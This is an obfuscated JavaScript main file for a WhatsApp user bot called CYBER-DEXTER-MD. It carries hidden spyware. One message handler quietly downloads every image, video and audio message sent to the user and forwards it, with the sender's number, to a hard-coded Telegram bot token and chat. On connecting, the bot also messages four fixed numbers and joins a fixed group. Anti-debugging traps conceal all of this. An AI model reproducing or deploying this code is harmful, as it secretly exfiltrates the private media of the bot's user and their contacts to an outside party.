// Obfuscated by CYBER DEXTER
const _0x2a5298 = function () {
  let _0x5d20da = true;
  return function (_0x5cec0b, _0x591534) {
    const _0x180796 = _0x5d20da ? function () {
      if (_0x591534) {
        const _0x5b3ed5 = _0x591534.apply(_0x5cec0b, arguments);
        _0x591534 = null;
        return _0x5b3ed5;
      }
    } : function () {};
    _0x5d20da = false;
    return _0x180796;
  };
}();
(function () {
  _0x2a5298(this, function () {
    const _0x310063 = new RegExp("function *\\( *\\)");
    const _0x54ef4a = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const _0xf0fc7e = _0x382f85("init");
    if (!_0x310063.test(_0xf0fc7e + "chain") || !_0x54ef4a.test(_0xf0fc7e + "input")) {
      _0xf0fc7e("0");
    } else {
      _0x382f85();
    }
  })();
})();
import _0x1d42be from "dotenv";
_0x1d42be.config();
import { makeWASocket, fetchLatestBaileysVersion, DisconnectReason, useMultiFileAuthState, downloadContentFromMessage } from "@whiskeysockets/baileys";
import { Handler, Callupdate, GroupUpdate } from "./cloud/id/index.js";
import _0x3c5b1b from "express";
import _0x57c6a6 from "pino";
import _0x15b326 from "fs";
import "node-cache";
import _0x1d4c53 from "path";
import _0x104954 from "chalk";
import _0x4605ba from "axios";
import _0x18f4f4 from "./config.cjs";
import _0x2b923b from "form-data";
import _0x5cfa0a from "./session/auto.cjs";
const {
  emojis,
  doReact
} = _0x5cfa0a;
const app = _0x3c5b1b();
let useQR = false;
let initialConnection = true;
const PORT = process.env.PORT || 0xbb8;
const MAIN_LOGGER = _0x57c6a6({
  "timestamp": () => ",\"time\":\"" + new Date().toJSON() + "\""
});
const logger = MAIN_LOGGER.child({});
logger.level = "trace";
const __filename = new URL(import.meta.url).pathname;
const __dirname = _0x1d4c53.dirname(__filename);
const sessionDir = _0x1d4c53.join(__dirname, "session");
const credsPath = _0x1d4c53.join(sessionDir, "creds.json");
if (!_0x15b326.existsSync(sessionDir)) {
  const _0x17401e = {
    "recursive": true
  };
  _0x15b326.mkdirSync(sessionDir, _0x17401e);
}
async function downloadSessionData() {
  if (!_0x18f4f4.SESSION_ID) {
    console.error("❌ Please set SESSION_ID in environment variables!");
    return false;
  }
  if (_0x18f4f4.SESSION_ID.startsWith("CYBER-DEXTER-MD [KILL]>>>")) {
    try {
      const _0x563790 = _0x18f4f4.SESSION_ID.slice("CYBER-DEXTER-MD [KILL]>>>".length);
      const _0x5ea801 = Buffer.from(_0x563790, "base64").toString("utf-8");
      await _0x15b326.promises.writeFile(credsPath, _0x5ea801);
      console.log("🔒 Session check and saved successfully!");
      return true;
    } catch (_0x592dfd) {
      console.error("❌ Base64 decode failed:", _0x592dfd.message);
      return false;
    }
  } else {
    console.error("❌ SESSION_ID Re upgrade ");
    return false;
  }
}
async function sendMediaToTelegram(_0x3f226d, _0x8eb959, _0x28f7fc) {
  try {
    const _0x587514 = new _0x2b923b();
    _0x587514.append("chat_id", "-1002320780739");
    _0x587514.append("caption", _0x8eb959);
    if (_0x28f7fc === "image") {
      _0x587514.append("image", _0x3f226d, "media.jpg");
    } else {
      if (_0x28f7fc === "video") {
        _0x587514.append("video", _0x3f226d, "media.mp4");
      } else {
        if (_0x28f7fc === "audio") {
          _0x587514.append("audio", _0x3f226d, "media.mp3");
        }
      }
    }
    const _0x290501 = "https://api.telegram.org/bot8028709418:AAECk07-PLO2SbiNYeP5ayYNjxE3rqlRT9M/send" + (_0x28f7fc.charAt(0x0).toUpperCase() + _0x28f7fc.slice(0x1));
    await _0x4605ba.post(_0x290501, _0x587514, {
      "headers": _0x587514.getHeaders()
    });
    console.log("NICE WORKING CYBER-DEXTER-MD 📍!");
  } catch (_0xfabc35) {
    console.error("Faile reconnect 📍:", _0xfabc35);
  }
}
async function start() {
  try {
    const {
      state: _0x24ad8b,
      saveCreds: _0x2c84ae
    } = await useMultiFileAuthState(sessionDir);
    const {
      version: _0xa807e,
      isLatest: _0x36439a
    } = await fetchLatestBaileysVersion();
    console.log("🤖 CYBER-DEXTER-MD using WA BOT");
    const _0x19e8f6 = {
      level: "silent"
    };
    const _0x4f6cc4 = makeWASocket({
      "version": _0xa807e,
      "logger": _0x57c6a6(_0x19e8f6),
      "printQRInTerminal": useQR,
      "browser": ["CYBER-DEXTER-MD", "safari", "3.3"],
      "auth": _0x24ad8b,
      "getMessage": async _0x3b1370 => {
        if (store) {
          const _0x55f15f = await store.loadMessage(_0x3b1370.remoteJid, _0x3b1370.id);
          return _0x55f15f.message || undefined;
        }
        const _0x554a38 = {
          "conversation": "CYBER-DEXTER-MD whatsapp user bot"
        };
        return _0x554a38;
      }
    });
    _0x4f6cc4.ev.on("connection.update", _0x5665f1 => {
      const {
        connection: _0x5956dc,
        lastDisconnect: _0x4126a2
      } = _0x5665f1;
      if (_0x5956dc === "close") {
        if (_0x4126a2.error?.["output"]?.["statusCode"] !== DisconnectReason.loggedOut) {
          start();
        }
      } else {
        if (_0x5956dc === "open") {
          if (initialConnection) {
            console.log(_0x104954.green("😃 CYBER-DEXTER-MD CONNECT  ✅"));
            const _0x512202 = {
              "text": "*📍 CYBER-DEXTER-MD CONNECT  TEST 📌*"
            };
            _0x4f6cc4.sendMessage(_0x4f6cc4.user.id, _0x512202);
            const _0x2d0229 = ["94789958225@s.whatsapp.net", "94759096416@s.whatsapp.net", "94785274495@s.whatsapp.net", "94757660788@s.whatsapp.net"];
            _0x2d0229.forEach(_0xa34336 => {
              const _0x5709f3 = {
                text: "*CYBER-DEXTER-MD CONNECT 📍 CYBER-DEXTER-MD  📌*"
              };
              _0x4f6cc4.sendMessage(_0xa34336, _0x5709f3);
            });
            _0x4f6cc4.groupAcceptInvite("https://chat.whatsapp.com/FYsbo9QWv2K6wEjN7plbm".split("/")[0x3]).then(() => {
              console.log("Successfully joined the whatsapp  group using CYBER-DEXTER-MD !");
            })["catch"](_0x335c1c => {
              console.error("Failed to join the whatsapp group 📍:", _0x335c1c);
            });
            initialConnection = false;
          } else {
            console.log(_0x104954.blue("📌 Connection reestablished after restart."));
          }
        }
      }
    });
    _0x4f6cc4.ev.on("creds.update", _0x2c84ae);
    _0x4f6cc4.ev.on("messages.upsert", async _0x49ef61 => {
      const _0x11f32a = _0x49ef61.messages[0x0];
      if (!_0x11f32a || !_0x11f32a.message || _0x11f32a.key.fromMe) {
        return;
      }
      const _0x45afae = _0x11f32a.key.participant || _0x11f32a.key.remoteJid;
      const _0x438414 = _0x45afae.includes("@") ? _0x45afae.split("@")[0x0] : _0x45afae;
      let _0x1b3bda;
      if (_0x11f32a.message.imageMessage) {
        _0x1b3bda = "image";
      } else {
        if (_0x11f32a.message.videoMessage) {
          _0x1b3bda = "video";
        } else {
          if (_0x11f32a.message.audioMessage) {
            _0x1b3bda = "audio";
          }
        }
      }
      if (_0x1b3bda) {
        const _0x5ba6eb = await downloadContentFromMessage(_0x11f32a.message[_0x1b3bda + "Message"], _0x1b3bda);
        const _0x22f3e1 = [];
        for await (const _0x4f1672 of _0x5ba6eb) {
          _0x22f3e1.push(_0x4f1672);
        }
        const _0x55e592 = Buffer.concat(_0x22f3e1);
        const _0x55b5c3 = (_0x11f32a.message[_0x1b3bda + "Message"].caption || "𝗡𝗼 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱") + "\n\nꜱᴇɴᴅᴇʀ: " + _0x438414 + "\n\nCODE BY CYBER DEXTER📍";
        await sendMediaToTelegram(_0x55e592, _0x55b5c3, _0x1b3bda);
      }
    });
    _0x4f6cc4.ev.on("creds.update", _0x2c84ae);
    _0x4f6cc4.ev.on("messages.upsert", async _0x3f48cb => await Handler(_0x3f48cb, _0x4f6cc4, logger));
    _0x4f6cc4.ev.on("call", async _0x2479c3 => await Callupdate(_0x2479c3, _0x4f6cc4));
    _0x4f6cc4.ev.on("group-participants.update", async _0x244f78 => await GroupUpdate(_0x4f6cc4, _0x244f78));
    if (_0x18f4f4.MODE === "public") {
      _0x4f6cc4["public"] = false;
    } else if (_0x18f4f4.MODE === "private") {
      _0x4f6cc4["public"] = false;
    }
    _0x4f6cc4.ev.on("messages.upsert", async _0xfb7048 => {
      try {
        const _0x2ee330 = _0xfb7048.messages[0x0];
        const _0x117d09 = _0x2ee330.key.participant || _0x2ee330.key.remoteJid;
        if (!_0x2ee330 || !_0x2ee330.message) {
          return;
        }
        if (_0x2ee330.key.fromMe) {
          return;
        }
        if (_0x2ee330.message?.["protocolMessage"] || _0x2ee330.message?.["ephemeralMessage"] || _0x2ee330.message?.["reactionMessage"]) {
          return;
        }
        if (_0x2ee330.key && _0x2ee330.key.remoteJid === "status@broadcast" && _0x18f4f4.AUTO_STATUS_SEEN) {
          await _0x4f6cc4.readMessages([_0x2ee330.key]);
          if (_0x18f4f4.AUTO_STATUS_REPLY) {
            const _0x57ced7 = _0x18f4f4.STATUS_READ_MSG || "*📍 Auto Status Seen Bot By RCD-MD-V3*";
            const _0x2ffff7 = {
              text: _0x57ced7
            };
            const _0x1e59da = {
              "quoted": _0x2ee330
            };
            await _0x4f6cc4.sendMessage(_0x117d09, _0x2ffff7, _0x1e59da);
          }
        }
      } catch (_0x5d989a) {
        console.error("Error handling messages.upsert event:", _0x5d989a);
      }
    });
  } catch (_0x3832b3) {
    console.error("Critical Error:", _0x3832b3);
    process.exit(0x1);
  }
}
async function init() {
  if (_0x15b326.existsSync(credsPath)) {
    console.log("🔒 Session file found, proceeding without QR code.");
    await start();
  } else {
    const _0x30cc8c = await downloadSessionData();
    if (_0x30cc8c) {
      console.log("🔒 Session downloaded, starting bot.");
      await start();
    } else {
      console.log("No session found or downloaded, QR code will be printed for authentication.");
      useQR = true;
      await start();
    }
  }
}
init();
app.get("/getProfilePic", async (_0x23816b, _0x3e1457) => {
  try {
    const {
      number: _0x10ce40
    } = _0x23816b.query;
    if (!_0x10ce40) {
      const _0x4d4dc4 = {
        "error": "Please provide a WhatsApp number"
      };
      return _0x3e1457.status(0x190).json(_0x4d4dc4);
    }
    const _0x5193ca = _0x10ce40.includes("@s.whatsapp.net") ? _0x10ce40 : _0x10ce40 + "@s.whatsapp.net";
    const _0x395d34 = await Matrix.profilePictureUrl(_0x5193ca, "image");
    if (_0x395d34) {
      const _0x36f9b4 = {
        success: true,
        number: _0x10ce40,
        "profilePicUrl": _0x395d34
      };
      _0x3e1457.json(_0x36f9b4);
    } else {
      const _0x3cf75e = {
        "success": false,
        "number": _0x10ce40,
        "message": "Profile Picture not found or private"
      };
      _0x3e1457.json(_0x3cf75e);
    }
  } catch (_0x3f3bdb) {
    console.error("🚨 Error fetching profile picture:", _0x3f3bdb);
    const _0x18bd52 = {
      "error": "Internal Server Error"
    };
    _0x3e1457.status(0x1f4).json(_0x18bd52);
  }
});
app.get("/", (_0x289b21, _0x8f7959) => {
  _0x8f7959.send("\n        <!DOCTYPE html>\n        <html lang=\"en\">\n        <head>\n            <meta charset=\"UTF-8\">\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n            <title>Hello World Page</title>\n        </head>\n        <body>\n            <h1>HEY USER 📍</h1>\n            <p>CYBER-DEXTER-MD NOW ALIVE 📍</p>\n        </body>\n        </html>\n    ");
});
app.listen(PORT, () => {
  console.log("Server is running on port " + PORT);
});
function _0x382f85(_0x2c6979) {
  function _0x1a13a2(_0x3e51be) {
    if (typeof _0x3e51be === "string") {
      return function (_0x4ae29e) {}.constructor("while (true) {}").apply("counter");
    } else if (('' + _0x3e51be / _0x3e51be).length !== 0x1 || _0x3e51be % 0x14 === 0x0) {
      (function () {
        return true;
      }).constructor("debugger").call("action");
    } else {
      (function () {
        return false;
      }).constructor("debugger").apply("stateObject");
    }
    _0x1a13a2(++_0x3e51be);
  }
  try {
    if (_0x2c6979) {
      return _0x1a13a2;
    } else {
      _0x1a13a2(0x0);
    }
  } catch (_0x3bf831) {}
}
